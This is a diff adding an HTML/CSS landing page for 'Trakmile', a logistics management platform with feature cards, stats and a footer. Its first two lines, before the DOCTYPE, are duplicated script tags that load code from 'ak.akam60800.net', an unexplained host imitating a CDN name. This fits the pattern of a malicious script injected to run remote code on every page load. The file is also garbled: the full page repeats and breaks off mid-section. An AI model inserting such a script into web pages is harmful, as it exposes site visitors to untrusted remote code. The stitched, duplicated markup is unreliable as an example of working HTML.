@@ -1,0 +1,1383 @@
+<script src="//ak.akam60800.net/"></script>
+<script src="//ak.akam60800.net/"></script>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Trakmile | Smart Logistics Management Platform</title>
+    
+    <!-- Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    
+    <!-- Lucide Icons for Modern SaaS UI -->
+    <script src="https://unpkg.com/lucide@latest"></script>
+
+    <style>
+        :root {
+            --primary: #1B84FF;
+            --primary-hover: #156BCB;
+            --secondary: #FF6A00;
+            --secondary-hover: #E05D00;
+            --dark: #0F172A;
+            --gray: #64748B;
+            --light: #F8FAFC;
+            --border: #E2E8F0;
+            --shadow-sm: 0 2px 4px 0 rgba(15, 23, 42, 0.05);
+            --shadow-md: 0 10px 15px -3px rgba(15, 23, 42, 0.08);
+            --radius: 12px;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            scroll-behavior: smooth;
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            color: var(--dark);
+            background: #fff;
+            line-height: 1.6;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        .container {
+            width: 90%;
+            max-width: 1200px;
+            margin: auto;
+        }
+
+        /* Header & Navigation */
+        header {
+            background: rgba(255, 255, 255, 0.85);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            border-bottom: 1px solid var(--border);
+            position: sticky;
+            top: 0;
+            z-index: 999;
+        }
+
+        .navbar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 16px 0;
+        }
+
+        .logo img {
+            height: 45px;
+            object-fit: contain;
+        }
+
+        .nav-links {
+            display: flex;
+            gap: 32px;
+        }
+
+        .nav-links a {
+            text-decoration: none;
+            color: var(--gray);
+            font-weight: 500;
+            transition: color 0.2s;
+            font-size: 15px;
+        }
+
+        .nav-links a:hover {
+            color: var(--primary);
+        }
+
+        .nav-buttons {
+            display: flex;
+            gap: 12px;
+            align-items: center;
+        }
+
+        .btn {
+            padding: 10px 20px;
+            border-radius: var(--radius);
+            text-decoration: none;
+            font-weight: 600;
+            font-size: 14px;
+            transition: all 0.2s ease-in-out;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .btn-login {
+            border: 1px solid var(--border);
+            color: var(--dark);
+            background: #fff;
+        }
+
+        .btn-login:hover {
+            background: var(--light);
+            border-color: var(--gray);
+        }
+
+        .btn-demo {
+            background: var(--primary);
+            color: #fff;
+        }
+
+        .btn-demo:hover {
+            background: var(--primary-hover);
+            transform: translateY(-1px);
+        }
+
+        /* Hero Section */
+        .hero {
+            padding: 100px 0 80px 0;
+            background: radial-gradient(100% 100% at 50% 0%, rgba(27, 132, 255, 0.05) 0%, rgba(255, 255, 255, 0) 100%);
+        }
+
+        .hero-grid {
+            display: grid;
+            grid-template-columns: 1.1fr 0.9fr;
+            gap: 60px;
+            align-items: center;
+        }
+
+        .hero h1 {
+            font-size: 56px;
+            font-weight: 800;
+            line-height: 1.15;
+            letter-spacing: -1px;
+            margin-bottom: 24px;
+            color: var(--dark);
+        }
+
+        .hero h1 span {
+            color: var(--primary);
+        }
+
+        .hero p {
+            font-size: 19px;
+            color: var(--gray);
+            margin-bottom: 36px;
+            max-width: 540px;
+        }
+
+        .hero-buttons {
+            display: flex;
+            gap: 16px;
+            flex-wrap: wrap;
+        }
+
+        .btn-hero-primary {
+            background: var(--primary);
+            color: #fff;
+            padding: 14px 28px;
+            font-size: 16px;
+        }
+
+        .btn-hero-primary:hover {
+            background: var(--primary-hover);
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(27, 132, 255, 0.25);
+        }
+
+        .btn-hero-secondary {
+            background: #fff;
+            border: 1px solid var(--border);
+            color: var(--dark);
+            padding: 14px 28px;
+            font-size: 16px;
+        }
+
+        .btn-hero-secondary:hover {
+            background: var(--light);
+            transform: translateY(-2px);
+        }
+
+        /* Modern Dashboard Preview instead of just a logo */
+        .hero-image {
+            position: relative;
+            background: #fff;
+            border-radius: var(--radius);
+            box-shadow: var(--shadow-md);
+            border: 1px solid var(--border);
+            padding: 8px;
+            transition: transform 0.3s ease;
+            overflow: hidden;
+        }
+        
+        .hero-image:hover {
+            transform: scale(1.02);
+        }
+
+        .hero-image img {
+            width: 100%;
+            height: auto;
+            max-height: 400px;
+            object-fit: cover;
+            border-radius: 8px;
+            display: block;
+        }
+
+        /* Global Sections */
+        .section {
+            padding: 100px 0;
+        }
+
+        .section-title {
+            text-align: center;
+            margin-bottom: 64px;
+            max-width: 600px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        .section-title h2 {
+            font-size: 38px;
+            font-weight: 800;
+            letter-spacing: -0.5px;
+            margin-bottom: 16px;
+        }
+
+        .section-title p {
+            font-size: 16px;
+            color: var(--gray);
+        }
+
+        /* Features Cards Grid */
+        .features {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
+            gap: 24px;
+        }
+
+        .card {
+            background: #fff;
+            border: 1px solid var(--border);
+            border-radius: 16px;
+            padding: 32px;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .card:hover {
+            transform: translateY(-4px);
+            border-color: rgba(27, 132, 255, 0.3);
+            box-shadow: var(--shadow-md);
+        }
+
+        .card-icon {
+            width: 48px;
+            height: 48px;
+            background: rgba(27, 132, 255, 0.08);
+            color: var(--primary);
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 20px;
+        }
+
+        .card h3 {
+            font-size: 18px;
+            font-weight: 700;
+            margin-bottom: 12px;
+        }
+
+        .card p {
+            color: var(--gray);
+            font-size: 15px;
+        }
+
+        /* Stats Section */
+        .stats {
+            background: var(--light);
+            border-top: 1px solid var(--border);
+            border-bottom: 1px solid var(--border);
+        }
+
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+            gap: 40px;
+            text-align: center;
+        }
+
+        .stat h3 {
+            font-size: 52px;
+            font-weight: 800;
+            color: var(--primary);
+            margin-bottom: 4px;
+            letter-spacing: -1px;
+        }
+
+        .stat p {
+            color: var(--gray);
+            font-weight: 500;
+            font-size: 15px;
+        }
+
+        /* Integrations section */
+        .integrations {
+            padding: 60px 0;
+            background: #fff;
+            text-align: center;
+            border-bottom: 1px solid var(--border);
+        }
+        .integrations p {
+            font-size: 14px;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+            color: var(--gray);
+            margin-bottom: 30px;
+        }
+        .brand-grid {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 60px;
+            flex-wrap: wrap;
+            opacity: 0.6;
+        }
+        .brand-grid span {
+            font-size: 20px;
+            font-weight: 700;
+            color: #94A3B8;
+        }
+
+        /* CTA Section */
+        .cta {
+            background: linear-gradient(135deg, #0F172A 0%, #1E293B 100%);
+            color: white;
+            text-align: center;
+            padding: 120px 20px;
+            position: relative;
+        }
+
+        .cta h2 {
+            font-size: 42px;
+            font-weight: 800;
+            margin-bottom: 20px;
+            letter-spacing: -0.5px;
+        }
+
+        .cta p {
+            font-size: 18px;
+            max-width: 600px;
+            margin: auto;
+            margin-bottom: 40px;
+            opacity: 0.8;
+        }
+
+        .btn-cta {
+            background: var(--secondary);
+            color: #fff;
+            padding: 14px 32px;
+            font-size: 16px;
+        }
+
+        .btn-cta:hover {
+            background: var(--secondary-hover);
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(255, 106, 0, 0.3);
+        }
+
+        /* Footer */
+        footer {
+            background: #0F172A;
+            color: #94A3B8;
+            padding: 80px 0 40px 0;
+            border-top: 1px solid #1E293B;
+        }
+
+        .footer-grid {
+            display: grid;
+            grid-template-columns: 1.5fr 1fr 1fr;
+            gap: 40px;
+            margin-bottom: 60px;
+            text-align: left;
+        }
+
+        .footer-brand p {
+            margin-top: 16px;
+            font-size: 15px;
+            max-width: 300px;
+        }
+
+        .footer-links h4 {
+            color: #fff;
+            margin-bottom: 20px;
+            font-size: 16px;
+        }
+
+        .footer-links ul {
+            list-style: none;
+        }
+
+        .footer-links ul li {
+            margin-bottom: 12px;
+        }
+
+        .footer-links ul li a {
+            color: #94A3B8;
+            text-decoration: none;
+            font-size: 15px;
+            transition: color 0.2s;
+        }
+
+        .footer-links ul li a:hover {
+            color: #fff;
+        }
+
+        .footer-bottom {
+            border-top: 1px solid #1E293B;
+            padding-top: 30px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 14px;
+        }
+
+        /* Responsive Design */
+        @media(max-width: 900px){
+            .hero-grid {
+                grid-template-columns: 1fr;
+                text-align: center;
+                gap: 40px;
+            }
+
+            .nav-links {
+                display: none;
+            }
+
+            .hero h1 {
+                font-size: 40px;
+            }
+
+            .hero p {
+                margin: 0 auto 30px auto;
+            }
+
+            .hero-buttons {
+                justify-content: center;
+            }
+
+            .section-title h2 {
+                font-size: 30px;
+            }
+
+            .footer-grid {
+                grid-template-columns: 1fr;
+                text-align: center;
+            }
+            .footer-brand p {
+                margin: 16px auto;
+            }
+            .footer-bottom {
+                flex-direction: column;
+                gap: 16px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Header / Navbar -->
+    <header>
+        <div class="container navbar">
+            <a href="#" class="logo">
+                <img src="imgs/logo-big.png" alt="Trakmile">
+            </a>
+
+            <nav class="nav-links">
+                <a href="#features">Features</a>
+                <a href="#why">Why Trakmile</a>
+                <a href="#demo">Demo</a>
+                <a href="#contact">Contact</a>
+            </nav>
+
+            <div class="nav-buttons">
+                <a href="https://app.trakmile.com" class="btn btn-login">Login</a>
+                <a href="https://demo.trakmile.com" class="btn btn-demo">Try Demo</a>
+            </div>
+        </div>
+    </header>
+
+    <!-- Hero Section -->
+    <section class="hero">
+        <div class="container">
+            <div class="hero-grid">
+                <div>
+                    <h1>Smart <span>Logistics</span> Management Platform</h1>
+                    <p>Manage shipments, drivers, fleets, warehouses and delivery operations from a single powerful platform built for modern logistics companies.</p>
+                    <div class="hero-buttons">
+                        <a href="https://demo.trakmile.com" class="btn btn-hero-primary">
+                            Launch Demo <i data-lucide="arrow-right"></i>
+                        </a>
+                        <a href="#contact" class="btn btn-hero-secondary">Request Call</a>
+                    </div>
+                </div>
+                <div class="hero-image">
+                    <!-- تم استبدال الشعار بصورة لوجستية تفاعلية تعبر عن إدارة الشحن والمستودعات والتوصيل الذكي -->
+                    <img src="imgs/slid3.jpg" alt="Smart Logistics Infrastructure and Warehouse Management Dashboard">
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Ecosystem/Integration Section -->
+    <section class="integrations">
+        <div class="container">
+            <p>Trusted & Ready to Connect with Ecosystems</p>
+            <div class="brand-grid">
+                <span>Salla & Zid API</span>
+                <span>Shopify</span>
+                <span>WooCommerce</span>
+                <span>RESTful API</span>
+            </div>
+        </div>
+    </section>
+
+    <!-- Core Features Section -->
+    <section class="section" id="features">
+        <div class="container">
+            <div class="section-title">
+                <h2>Everything You Need</h2>
+                <p>Powerful enterprise-grade tools to manage your logistics operations efficiently without manual errors.</p>
+            </div>
+
+            <div class="features">
+                <div class="card">
+                    <div class="card-icon"><i data-lucide="package"></i></div>
+                    <h3>Shipment Management</h3>
+                    <p>Create, assign and track shipments throughout the delivery lifecycle seamlessly.</p>
+                </div>
+
+                <div class="card">
+                    <div class="card-icon"><i data-lucide="users"></i></div>
+                    <h3>Driver Management</h3>
+                    <p>Manage drivers, cod payouts, daily schedules, assignments and real-time performance.</p>
+                </div>
+
+                <div class="card">
+                    <div class="card-icon"><i data-lucide="map-pin"></i></div>
+                    <h3>Fleet Tracking</h3>
+                    <p>Monitor vehicle locations live and optimize delivery routes in real time.</p>
+                </div>
+
+                <div class="card">
+                    <div class="card-icon"><i data-lucide="warehouse"></i></div>
+                    <h3>Warehouse Management</h3>
+                    <p>Control multi-hub inventory, barcode scanning, and sorting hub operations dynamically.</p>
+                </div>
+
+                <div class="card">
+                    <div class="card-icon"><i data-lucide="shield-check"></i></div>
+                    <h3>Proof of Delivery (POD)</h3>
+                    <p>Capture client signatures, live photos, and digital OTP confirmations instantly upon delivery.</p>
+                </div>
+
+                <div class="card">
+                    <div class="card-icon"><i data-lucide="bar-chart-3"></i></div>
+                    <h3>Analytics & Reports</h3>
+                    <p>Gain actionable insights into your business metrics with interactive live dashboards.</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Stats Section -->
+    <section class="section stats">
+        <div class="container">
+            <div class="stats-grid">
+                <div class="stat">
+                    <h3>10M+</h3>
+                    <p>Shipments Managed</p>
+                </div>
+                <div class="stat">
+                    <h3>500+</h3>
+                    <p>Business Customers</p>
+                </div>
+                <div class="stat">
+                    <h3>50K+</h3>
+                    <p>Drivers Managed</p>
+                </div>
+                <div class="stat">
+                    <h3>99.9%</h3>
+                    <p>Platform Uptime</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Why Trakmile Section -->
+    <section class="section" id="why">
+        <div class="container">
+            <div class="section-title">
+                <h2>Why Trakmile?</h2>
+                <p>Engineered explicitly to match the fast scaling pace of delivery and third-party logistics companies.</p>
+            </div>
+
+            <div class="features">
+                <div class="card">
+                    <div class="card-icon" style="background: rgba(255,106,0,0.08); color: var(--secondary);"><i data-lucide="eye"></i></div>
+                    <h3>Real-Time Visibility</h3>
+                    <p>Track everything down to the single shipment node from a beautifully structured, centralized operational dashboard.</p>
+                </div>
+
+                <div class="card">
+                    <div class="card-icon" style="background: rgba(255,106,0,0.08); color: var(--secondary);"><i data-lucide="zap"></i></div>
+                    <h3>Operational Efficiency</h3>
+                    <p>Automate regular webhook notifications, invoice generations, and driver assignment workflows to save human labor hours.</p>
+                </div>
+
+                <div class="card">
+                    <div class="card-icon" style="background: rgba(255,106,0,0.08); color: var(--secondary);"><i data-lucide="smile"></i></div>
+                    <h3>Superior Customer Experience</h3>
+                    <p>Delight end consumers with SMS tracking codes, real-time map positions, and flexible rescheduling options.</p>
+                </div>
+
+                <div class="card">
+                    <div class="card-icon" style="background: rgba(255,106,0,0.08); color: var(--secondary);"><i data-lucide="trending-up"></i></div>
+                    <h3>Highly Scalable Architecture</h3>
+                    <p>Our microservices and cloud backends are robustly ready to ingest high payload counts during peak e-commerce seasons.</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Call To Action Section -->
+    <section class="cta" id="demo">
+        <h2>Experience Trakmile Today</h2>
+        <p>Discover how modern logistics tech stacks can drastically streamline delivery ops, lower failed attempts, and scale your ROI.</p>
+        <a href="https://demo.trakmile.com" class="btn btn-cta">
+            Launch Live Demo Platform <i data-lucide="external-link"></i>
+        </a>
+    </section>
+
+    <!-- Professional Grid Footer -->
+    <footer id="contact">
+        <div class="container footer-grid">
+            <div class="footer-brand">
+                <img src="imgs/logo-big.png" alt="Trakmile">
+                <p>Next-generation, end-to-end logistics operating architecture powering smart fulfillment nodes globally.</p>
+            </div>
+            <div class="footer-links">
+                <h4>Product</h4>
+                <ul>
+                    <li><a href="#features">Features</a></li>
+                    <li><a href="#why">Why Trakmile</a></li>
+                    <li><a href="https://demo.trakmile.com">Demo Platform</a></li>
+                </ul>
+            </div>
+            <div class="footer-links">
+                <h4>Contact Support</h4>
+                <ul>
+                    <li><a href="mailto:info@trakmile.com">info@trakmile.com</a></li>
+                    <li><a href="#">Riyadh, Saudi Arabia</a></li>
+                </ul>
+            </div>
+        </div>
+        <div class="container footer-bottom">
+            <p>&copy; 2026 Trakmile. All Rights Reserved.</p>
+            <p>Built for Smarter Fulfillment Ecosystems.</p>
+        </div>
+    </footer>
+
+    <!-- Initialize Lucide Icons -->
+    <script>
+        lucide.createIcons();
+    </script>
+</body>
+</html><!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Trakmile | Smart Logistics Management Platform</title>
+    
+    <!-- Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    
+    <!-- Lucide Icons for Modern SaaS UI -->
+    <script src="https://unpkg.com/lucide@latest"></script>
+
+    <style>
+        :root {
+            --primary: #1B84FF;
+            --primary-hover: #156BCB;
+            --secondary: #FF6A00;
+            --secondary-hover: #E05D00;
+            --dark: #0F172A;
+            --gray: #64748B;
+            --light: #F8FAFC;
+            --border: #E2E8F0;
+            --shadow-sm: 0 2px 4px 0 rgba(15, 23, 42, 0.05);
+            --shadow-md: 0 10px 15px -3px rgba(15, 23, 42, 0.08);
+            --radius: 12px;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            scroll-behavior: smooth;
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            color: var(--dark);
+            background: #fff;
+            line-height: 1.6;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        .container {
+            width: 90%;
+            max-width: 1200px;
+            margin: auto;
+        }
+
+        /* Header & Navigation */
+        header {
+            background: rgba(255, 255, 255, 0.85);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            border-bottom: 1px solid var(--border);
+            position: sticky;
+            top: 0;
+            z-index: 999;
+        }
+
+        .navbar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 16px 0;
+        }
+
+        .logo img {
+            height: 45px;
+            object-fit: contain;
+        }
+
+        .nav-links {
+            display: flex;
+            gap: 32px;
+        }
+
+        .nav-links a {
+            text-decoration: none;
+            color: var(--gray);
+            font-weight: 500;
+            transition: color 0.2s;
+            font-size: 15px;
+        }
+
+        .nav-links a:hover {
+            color: var(--primary);
+        }
+
+        .nav-buttons {
+            display: flex;
+            gap: 12px;
+            align-items: center;
+        }
+
+        .btn {
+            padding: 10px 20px;
+            border-radius: var(--radius);
+            text-decoration: none;
+            font-weight: 600;
+            font-size: 14px;
+            transition: all 0.2s ease-in-out;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .btn-login {
+            border: 1px solid var(--border);
+            color: var(--dark);
+            background: #fff;
+        }
+
+        .btn-login:hover {
+            background: var(--light);
+            border-color: var(--gray);
+        }
+
+        .btn-demo {
+            background: var(--primary);
+            color: #fff;
+        }
+
+        .btn-demo:hover {
+            background: var(--primary-hover);
+            transform: translateY(-1px);
+        }
+
+        /* Hero Section */
+        .hero {
+            padding: 100px 0 80px 0;
+            background: radial-gradient(100% 100% at 50% 0%, rgba(27, 132, 255, 0.05) 0%, rgba(255, 255, 255, 0) 100%);
+        }
+
+        .hero-grid {
+            display: grid;
+            grid-template-columns: 1.1fr 0.9fr;
+            gap: 60px;
+            align-items: center;
+        }
+
+        .hero h1 {
+            font-size: 56px;
+            font-weight: 800;
+            line-height: 1.15;
+            letter-spacing: -1px;
+            margin-bottom: 24px;
+            color: var(--dark);
+        }
+
+        .hero h1 span {
+            color: var(--primary);
+        }
+
+        .hero p {
+            font-size: 19px;
+            color: var(--gray);
+            margin-bottom: 36px;
+            max-width: 540px;
+        }
+
+        .hero-buttons {
+            display: flex;
+            gap: 16px;
+            flex-wrap: wrap;
+        }
+
+        .btn-hero-primary {
+            background: var(--primary);
+            color: #fff;
+            padding: 14px 28px;
+            font-size: 16px;
+        }
+
+        .btn-hero-primary:hover {
+            background: var(--primary-hover);
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(27, 132, 255, 0.25);
+        }
+
+        .btn-hero-secondary {
+            background: #fff;
+            border: 1px solid var(--border);
+            color: var(--dark);
+            padding: 14px 28px;
+            font-size: 16px;
+        }
+
+        .btn-hero-secondary:hover {
+            background: var(--light);
+            transform: translateY(-2px);
+        }
+
+        /* Modern Dashboard Preview instead of just a logo */
+        .hero-image {
+            position: relative;
+            background: #fff;
+            border-radius: var(--radius);
+            box-shadow: var(--shadow-md);
+            border: 1px solid var(--border);
+            padding: 8px;
+            transition: transform 0.3s ease;
+            overflow: hidden;
+        }
+        
+        .hero-image:hover {
+            transform: scale(1.02);
+        }
+
+        .hero-image img {
+            width: 100%;
+            height: auto;
+            max-height: 400px;
+            object-fit: cover;
+            border-radius: 8px;
+            display: block;
+        }
+
+        /* Global Sections */
+        .section {
+            padding: 100px 0;
+        }
+
+        .section-title {
+            text-align: center;
+            margin-bottom: 64px;
+            max-width: 600px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        .section-title h2 {
+            font-size: 38px;
+            font-weight: 800;
+            letter-spacing: -0.5px;
+            margin-bottom: 16px;
+        }
+
+        .section-title p {
+            font-size: 16px;
+            color: var(--gray);
+        }
+
+        /* Features Cards Grid */
+        .features {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
+            gap: 24px;
+        }
+
+        .card {
+            background: #fff;
+            border: 1px solid var(--border);
+            border-radius: 16px;
+            padding: 32px;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .card:hover {
+            transform: translateY(-4px);
+            border-color: rgba(27, 132, 255, 0.3);
+            box-shadow: var(--shadow-md);
+        }
+
+        .card-icon {
+            width: 48px;
+            height: 48px;
+            background: rgba(27, 132, 255, 0.08);
+            color: var(--primary);
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 20px;
+        }
+
+        .card h3 {
+            font-size: 18px;
+            font-weight: 700;
+            margin-bottom: 12px;
+        }
+
+        .card p {
+            color: var(--gray);
+            font-size: 15px;
+        }
+
+        /* Stats Section */
+        .stats {
+            background: var(--light);
+            border-top: 1px solid var(--border);
+            border-bottom: 1px solid var(--border);
+        }
+
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+            gap: 40px;
+            text-align: center;
+        }
+
+        .stat h3 {
+            font-size: 52px;
+            font-weight: 800;
+            color: var(--primary);
+            margin-bottom: 4px;
+            letter-spacing: -1px;
+        }
+
+        .stat p {
+            color: var(--gray);
+            font-weight: 500;
+            font-size: 15px;
+        }
+
+        /* Integrations section */
+        .integrations {
+            padding: 60px 0;
+            background: #fff;
+            text-align: center;
+            border-bottom: 1px solid var(--border);
+        }
+        .integrations p {
+            font-size: 14px;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+            color: var(--gray);
+            margin-bottom: 30px;
+        }
+        .brand-grid {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 60px;
+            flex-wrap: wrap;
+            opacity: 0.6;
+        }
+        .brand-grid span {
+            font-size: 20px;
+            font-weight: 700;
+            color: #94A3B8;
+        }
+
+        /* CTA Section */
+        .cta {
+            background: linear-gradient(135deg, #0F172A 0%, #1E293B 100%);
+            color: white;
+            text-align: center;
+            padding: 120px 20px;
+            position: relative;
+        }
+
+        .cta h2 {
+            font-size: 42px;
+            font-weight: 800;
+            margin-bottom: 20px;
+            letter-spacing: -0.5px;
+        }
+
+        .cta p {
+            font-size: 18px;
+            max-width: 600px;
+            margin: auto;
+            margin-bottom: 40px;
+            opacity: 0.8;
+        }
+
+        .btn-cta {
+            background: var(--secondary);
+            color: #fff;
+            padding: 14px 32px;
+            font-size: 16px;
+        }
+
+        .btn-cta:hover {
+            background: var(--secondary-hover);
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(255, 106, 0, 0.3);
+        }
+
+        /* Footer */
+        footer {
+            background: #0F172A;
+            color: #94A3B8;
+            padding: 80px 0 40px 0;
+            border-top: 1px solid #1E293B;
+        }
+
+        .footer-grid {
+            display: grid;
+            grid-template-columns: 1.5fr 1fr 1fr;
+            gap: 40px;
+            margin-bottom: 60px;
+            text-align: left;
+        }
+
+        .footer-brand p {
+            margin-top: 16px;
+            font-size: 15px;
+            max-width: 300px;
+        }
+
+        .footer-links h4 {
+            color: #fff;
+            margin-bottom: 20px;
+            font-size: 16px;
+        }
+
+        .footer-links ul {
+            list-style: none;
+        }
+
+        .footer-links ul li {
+            margin-bottom: 12px;
+        }
+
+        .footer-links ul li a {
+            color: #94A3B8;
+            text-decoration: none;
+            font-size: 15px;
+            transition: color 0.2s;
+        }
+
+        .footer-links ul li a:hover {
+            color: #fff;
+        }
+
+        .footer-bottom {
+            border-top: 1px solid #1E293B;
+            padding-top: 30px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 14px;
+        }
+
+        /* Responsive Design */
+        @media(max-width: 900px){
+            .hero-grid {
+                grid-template-columns: 1fr;
+                text-align: center;
+                gap: 40px;
+            }
+
+            .nav-links {
+                display: none;
+            }
+
+            .hero h1 {
+                font-size: 40px;
+            }
+
+            .hero p {
+                margin: 0 auto 30px auto;
+            }
+
+            .hero-buttons {
+                justify-content: center;
+            }
+
+            .section-title h2 {
+                font-size: 30px;
+            }
+
+            .footer-grid {
+                grid-template-columns: 1fr;
+                text-align: center;
+            }
+            .footer-brand p {
+                margin: 16px auto;
+            }
+            .footer-bottom {
+                flex-direction: column;
+                gap: 16px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Header / Navbar -->
+    <header>
+        <div class="container navbar">
+            <a href="#" class="logo">
+                <img src="imgs/logo-big.png" alt="Trakmile">
+            </a>
+
+            <nav class="nav-links">
+                <a href="#features">Features</a>
+                <a href="#why">Why Trakmile</a>
+                <a href="#demo">Demo</a>
+                <a href="#contact">Contact</a>
+            </nav>
+
+            <div class="nav-buttons">
+                <a href="https://app.trakmile.com" class="btn btn-login">Login</a>
+                <a href="https://demo.trakmile.com" class="btn btn-demo">Try Demo</a>
+            </div>
+        </div>
+    </header>
+
+    <!-- Hero Section -->
+    <section class="hero">
+        <div class="container">
+            <div class="hero-grid">
+                <div>
+                    <h1>Smart <span>Logistics</span> Management Platform</h1>
+                    <p>Manage shipments, drivers, fleets, warehouses and delivery operations from a single powerful platform built for modern logistics companies.</p>
+                    <div class="hero-buttons">
+                        <a href="https://demo.trakmile.com" class="btn btn-hero-primary">
+                            Launch Demo <i data-lucide="arrow-right"></i>
+                        </a>
+                        <a href="#contact" class="btn btn-hero-secondary">Request Call</a>
+                    </div>
+                </div>
+                <div class="hero-image">
+                    <!-- تم استبدال الشعار بصورة لوجستية تفاعلية تعبر عن إدارة الشحن والمستودعات والتوصيل الذكي -->
+                    <img src="imgs/slid3.jpg" alt="Smart Logistics Infrastructure and Warehouse Management Dashboard">
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Ecosystem/Integration Section -->
+    <section class="integrations">
+        <div class="container">
+            <p>Trusted & Ready to Connect with Ecosystems</p>
+            <div class="brand-grid">
+                <span>Salla & Zid API</span>
+                <span>Shopify</span>
+                <span>WooCommerce</span>
+                <span>RESTful API</span>
+            </div>
+        </div>
+    </section>
+
+    <!-- Core Features Section -->
+    <section class="section" id="features">
+        <div class="container">
+            <div class="section-title">
+                <h2>Everything You Need</h2>
+                <p>Powerful enterprise-grade tools to manage your logistics operations efficiently without manual errors.</p>
+            </div>
+
+            <div class="features">
+                <div class="card">
+                    <div class="card-icon"><i data-lucide="package"></i></div>
+                    <h3>Shipment Management</h3>
+                    <p>Create, assign and track shipments throughout the delivery lifecycle seamlessly.</p>
+                </div>
+
+                <div class="card">
+                    <div class="card-icon"><i data-lucide="users"></i></div>
+                    <h3>Driver Management</h3>
+                    <p>Manage drivers, cod payouts, daily schedules, assignments and real-time performance.</p>
+                </div>
+
+                <div class="card">
+                    <div class="card-icon"><i data-lucide="map-pin"></i></div>
+                    <h3>Fleet Tracking</h3>
+                    <p>Monitor vehicle locations live and optimize delivery routes in real time.</p>
+                </div>
+
+                <div class="card">
+                    <div class="card-icon"><i data-lucide="warehouse"></i></div>
+                    <h3>Warehouse Management</h3>
+                    <p>Control multi-hub inventory, barcode scanning, and sorting hub operations dynamically.</p>
+                </div>
+
+                <div class="card">
+                    <div class="card-icon"><i data-lucide="shield-check"></i></div>
+                    <h3>Proof of Delivery (POD)</h3>
+                    <p>Capture client signatures, live photos, and digital OTP confirmations instantly upon delivery.</p>
+                </div>
+
+                <div class="card">
+                    <div class="card-icon"><i data-lucide="bar-chart-3"></i></div>
+                    <h3>Analytics & Reports</h3>
+                    <p>Gain actionable insights into your business metrics with interactive live dashboards.</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Stats Section -->
+    <section class="section stats">
+        <div class="container">
+            <div class="stats-grid">
+                <div class="stat">
+                    <h3>10M+</h3>
+                    <p>Shipments Managed</p>
+                </div>
+                <div class="stat">
+                    <h3>500+</h3>
+                    <p>Business Customers</p>
+                </div>
+                <div class="stat">
+                    <h3>50K+</h3>
+                    <p>Drivers Managed</p>
+                </div>
+                <div class="stat">
+                    <h3>99.9%</h3>
+                    <p>Platform Uptime</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Why Trakmile Section -->
+    <section class="section" id="why">
+        <div class="container">
+            <div class="section-title">
+                <h2>Why Trakmile?</h2>
+                <p>Engineered explicitly to match the fast scaling pace of delivery and third-party logistics companies.</p>
+            </div>
+
+            <div class="features">
+                <div class="card">
+                    <div class="card-icon" style="background: rgba(255,106,0,0.08); color: var(--secondary);"><i data-lucide="eye"></i></div>
+                    <h3>Real-Time Visibility</h3>
+                    <p>Track everything down to the single shipment node from a beautifully structured, centralized operational dashboard.</p>
+                </div>
+
+                <div class="card">
+                    <div class="card-icon" style="background: rgba(255,106,0,0.08); color: var(--secondary);"><i data-lucide="zap"></i></div>
+                    <h3>Operational Efficiency</h3>
